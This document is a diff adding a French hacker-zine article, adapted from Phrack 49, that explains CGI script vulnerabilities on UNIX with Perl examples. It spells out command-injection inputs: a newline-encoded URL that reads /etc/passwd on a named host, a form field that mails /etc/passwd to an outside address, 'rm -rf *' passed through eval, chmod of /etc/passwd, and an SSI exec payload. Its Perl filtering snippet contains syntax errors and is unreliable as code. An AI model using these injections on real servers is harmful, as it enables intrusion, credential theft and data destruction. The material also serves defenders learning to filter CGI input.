@@ -1,0 +1,226 @@
+  -= Les trous de securites des CGI (d'apres Phrack 49, vol.7 fichier 8) =-
+
+Cette chose va parler des CGI (Common Gateway Interface), de ses relations
+vers le oueb et le net, et surtout d'un point au niveau des vulnerabilites
+exposees quand par leurs usage. La plate forme en question est UNIX, et les
+exemples en PERL.
+
+Introduction
+=-=-=-=-=-=-
+Les CGI sont une norme d'"interface" qui permet la communication entre des
+clients et serveurs d'information qui comprennent le protocole HTTP
+(Hyper-Text Transfer Protocol). TCP/IP est le protocole de communication
+utilise par le script cgi et le serveur durant la communication, qui par
+defaut est sur le port 80, mais qui peut etre specifie sur n'importe quel
+port (de preference non priviligie :>)
+
+Les scripts CGI peuvent paraitre relativement simples du cote du client. Un
+tel script peut etre utiliser pour formater un document HTML (Hyper-Text
+Markup Language), creer un document HTML, creer de maniere dynamique une
+image. CGI stoque ses informations dans des variables d'environnement
+systeme qui peuvent etre accedees a travers les scripts CGI. Les scripts CGI
+peuvent  accepter des arguments sur la ligne de commande.
+
+Les scripts CGI peuvent etre ecrits en compilant des langages de
+programmation, ou langages interpretes tels que AppleScript, TCL, PERL, ou
+shell script Unix, dont les derniers permettent de modifier facilement les
+sources, et qui souvent est plus rapide a developper que des programmes
+compiles.
+
+Les methodes disponibles pour un programme CGI est definit dans les
+specifications du protocole HHTP 1.0. Les 3 methodes sont le "GET", le
+"POST" et le "PUT". GET recupere les informations du client vers le serveur,
+POST  demande au serveur d'accepter les infos qui sont passees depuis le
+serveur  vers le client, et le PUT demande au serveur d'accepter les
+informations  depuis le client (en bref..)
+
+Vulnerabilites
+=-=-=-=-=-=-=-
+Les vulnerabilites causes par l'utilisation des scripts CGI (arf et le phf?
+:) ) ne sont pour la plupart du temps des trous des CGI eux memes, ni du
+serveur HTTP, mais CGI simplement permet l'access a ces vulnerabilites. Il y
+a d'autres moyens pour exploiter une vulnerabilite sur une box.  Par
+exemple, des mauvaises permissions de fichiers peuvent etre exploitees en
+utilisant FTP ou Telnet. CGI permet simplement plus d'opportunites pour
+exploiter celles ci...
+
+Les specifications de CGI permettent eventuellement de lire des fichiers,
+recuperer un access shell, et conrompre le systeme de fichiers sur les
+machines qui servent de serveur et leurs machines ratachees. La
+signification  de permettre l'access inclut : exploiter des commandes par le
+script.
+
+D'apres les specifications HTTP 1.0, les donnees qui passent par un script
+CGI doivent etre encodees pour qu'il marche sur n'importe quel type de
+materiel et de plate forme logicielle. Les donnees qui passent par un script
+CGI en utilisant la methode GET sont ajoutee a la fin de l'URL (Universal
+Resource Locator). Les donnees sont accedees par le script CGI dans une
+variable d'environnement appellee QUERY_STRING. Les donnees sont de la
+forme variable=valeur, avec certaines valeurs (les caracteres non
+alphanumeriques) qui doivent etre "echapees", ce qui signifie que l'on
+prend leurs valeurs encodees en deux caracteres hexadecimaux. Le caractere
+qui informe de cet encodage est % dans l'URL (%20 pour espace). C'est la
+responsabilite des scripts CGI d'echapper ou d'enlever les caracteres dans
+des donnees qui lui sont donnees. Les caracteres tels que "<" ou ">", les
+delimiteurs pour les tags HTML, sont courament enlevees en utilisant une
+simple operation de recherche et remplacage, comme par exemple :
+
+----------------8<------------------------------------------------------------
+
+# Traitement des valeurs entrees
+{$NAME, $VALUE) = split(/=/, $_);       # separer l'entree sous la forme
+                                        # variable=valeur
+$VALUE =~ s/\+/ /g;                     # Remplacer "+" par " "
+$VALUE =~ s/%([0-9|A-F]{2})/pack(C,hex,{$1}}/eg;  # Remplacer les caracteres
+                                                  # %xx par leurs valeurs ASCII
+
+# Virer les caracteres a echapper
+$VALUE =~ s/([;<>\*\|'&\$!#\(\)\[\]\{\}:"])/\\$1/g;# Enlever les caracteres
+                                                   # non voulus
+$MYDATA[$NAME} = $VALUE;        # Assigner la valeur a son tableau associe
+
+----------------8<------------------------------------------------------------
+
+Cet exemple enleve les caracteres speciaux tels que le caractere de
+semi-colonne, qui est interprete par le shell par un separateur de
+commandes.  L'inclusion d'une semi-colonne dans les donnees d'entree permet
+la possibilite d'ajouter une commande additionnelle dans la ligne de
+commande.
+
+L'exemple suivant est incomplet puisqu'il n'adressse pas la possibilite d'un
+caractere "nouvelle ligne" (%0a), qui peut etre utilise pour executer des
+commandes autres que celles voulues par le script. Il est possible d'ajouter
+un champ a une URL pour executer des fonctions hors du script. Par exemple,
+l'URL suivante demande une copie de /etc/passwd depuis la machine serveur :
+
+http://www.odci.gov/cgi-bin/query?%0a/bin/cat%20/etc/passwd
+
+Les caracteres "%0a" et "%20" sont respectivement un retour a la ligne et un
+espace en ASCII.
+
+L'interface finale du programme CGI est un document HTML appele formulaire.
+Les formulaires incluent le tag HTML <INPUT>. Chaque tag <INPUT> a un nom de
+variable associe avec lui. Les scripts CGI actuels filtrent souvent le
+contenu du champ <INPUT>. Mais si le script ne filtre pas les caracteres
+speciaux, alors une situation similaire a la precedente existe. Les scripts
+CGI Interpretes qui manquent a louper les donnees de <INPUT> vont passer les
+donnees directement a l'interpreteur.
+
+Un autre tag HTML quiest parfois vu dans les formulaires est le tag
+<SELECT>, qui permet a l'utilisateur sur la machine client de selectionner
+parmi un nombre fini de choix. La selection donne egalement variable=valeur
+au script  CGI. Couramment les scripts CGI manquent a verifier les donnees
+depuis un champ <SELECT>, en supposant qu'il y ait seulement des donnees
+predefinies. Encore, les donnees passent directement vers l'interpreteur
+pour les langages interpretes. Les programmes compiles qui ne verifient pas
+la validite et/ou de caracteres speciaux peuvent egalement etre vulnerables.
+
+Un shell script ou en PERL qui appelles le programme mail peut etre
+vulnerable a un caractere indesire. Mail accepte les commandes depuis le
+formulaire "~!command" et fork un shell et execute la commande, si le script
+CGI ne filtre pas les caracteres "~!", le systeme est vulnerable. Les trous
+de sendmail peuvent etre egalement exploites dans ce cas. Aussi, la solution
+est de trouver un script qui ne filtre pas correctement les caracteres
+d'entree.
+
+Si tu trouves un script CGI qui contient un appel UNIX Systeme  (UNIX
+system()) avec un seul argument, alors tu as trouve un trou sur le  systeme.
+Quand la fonction system() est appelee avec un seul argument, le  systeme
+fork un shell separe pour permettre la demande. Quand cela arrive,  il est
+possible d'ajouter des donnees et de generer des resultats non voulus  par
+le serveur. Par exemple, un script PERL qui contient la chose suivante:
+
+system("/usr/bin/sendmail -t %s < %s", $adresse_a_mailer < $fichier_entre");
+
+a ete designe pour mailer une copie de $fichier_entre a l'adresse
+electronique $adresse_a_mailer. En appelent system() avec un argument, le
+programme lance un shell separe a etre forke. En copiant et modifiant les
+donnees du formulaire:
+
+<INPUT TYPE="HIDDEN" NAME="adresse_a_mailer"  VALUE="address@server.com;mail
+cracker@hacker.com </etc/passwd">
+
+on peut exploiter un trou en obtenant le fichier /etc/passwd du serveur.
+
+La fonction system() n'est pas la seule commande qui forkera un nouveau
+shell.  La fonction exec() avec un simple argument permet egalement la meme
+exposition. Ouvrir un fichier et piper son resultat fork egalement un shell
+serape. En PERL, la fonction :
+
+open(FILE, "| program_name $ARGS");
+
+va ouvrir un fichier FILE et piper son contenu avec program_name, qui va
+etre execute en tant que shell separe.
+
+En PERL, la commande eval execute n'importe quel argument qui lui passe. les
+scripts CGI qui passent arbritairement les donnees de l'utilisateur vers la
+commande eval peuvent etre utilises pour executer ce que souhaite
+l'utilisateur, par exemple :
+
+$_ = $VALUE; s/"/\\"/g                $RESULT = eval qq/"$_"/;
+
+passerait les valeurs de $VALUE a eval essentiellement unchange, exepte
+pour s'assurer que de doubles guillemets ne confuseraient pas
+l'interpreteur. Si $VALUE contienait "rm -rf *", le resultat pourrait etre
+desastreux. Les permissions de fichiers devraient etre examinees avec
+beaucoup d'attention.  Les scripts CGI sont le monde lisible que le monde
+peut copier, modifier, et  remplacer. In addition, les scripts PERL qui
+contiennent des lignes d'include telles que la suivante "
+
+require "cgi-lib";
+
+inclusent une librairie appellee cgi-lib. Si la permition du fichier est
+incorrecte, le script est vulnerable. Pour verifier les permissions, les
+caracteres "%0a/bin/ls%20-la%20/usr/src/include" pourraient etre ajoutees a
+l'URL d'un script CGI utilisant la methode GET.
+
+Copier, modifier, et remplacer la librairie permettra aux utilisateurs
+d'executer des commandes ou routines a l'interieur du fichier de librairie.
+Aussi, si l'interpreteur PERL, qui la plupart du temps reside dans /usr/bin,
+est lance en tant que SETSUID root, il est possible de modifier les
+permissions des fichiers en donnant une commande directe au systeme en
+utilisant l'interpreteur. La commande eval suivante permettrait l'execution
+de :
+
+$_ = "chmod 666 \/etc\/passwd" $RESULT = eval qq/"$_"/;
+
+et rendrait le fichier passwd en droit d'ecriture par tout le monde.
+
+Il y a une extention supportee par certains serveurs HTTP appeles SSI
+(Server Side Includes). C'est un mecanisme qui permet au serveur de
+modifier le document de sortie avant de l'envoyer au browser du client.  SSI
+est un ENORME trou de securite, et la plupart des sysadmin ont  desactives,
+a part les non experiences =). Donc, si dans les evenements tu  decouvres un
+site qui actives SSI, la syntaxe est:
+
+<!--#commande variable="valeur"-->
+
+Si la soucrce du script ne filtre pas correctement l'entree, une entree
+telle que:
+
+<!--#exec cmd="chmod 666 /etc/passwd"-->
+
+Toutes les commandes SSI commencent avec un diese (#) suivi qu'un mot cle.
+"exec cmd" lance un shell et execute une commande donnee entre les
+guillemets. Si cette option est mise en marche, tu as une enorme flexibilite
+avec laquelle tu peux te debrouiller sur la machine :).
+
+Conclusion
+=-=-=-=-=-
+
+L'utilisation non correcte de scripts CGI apporte au systeme un nombre
+important de vulnerabilites a la machine. Donc des echecs ou aucune
+verification des donnees entrees, lancer betement des appels a des
+fonctions, et des mauvaises permissions de fichiers peuvent etre exploitees
+grace (ou a cause) de CGI.
+
+Greetings
+=-=-=-=-=
+
+CoD4, mikasoft, sorcery, FfT, [GRYZOR], a tous ceux de #banane et surement
+pleins d'autres, et surtout aux xterms =)
+
+PS : sorry pour les fotes d'ortografe =)
+
+Pour PhE et NoRoute, de Kewl!
+-----------------------------
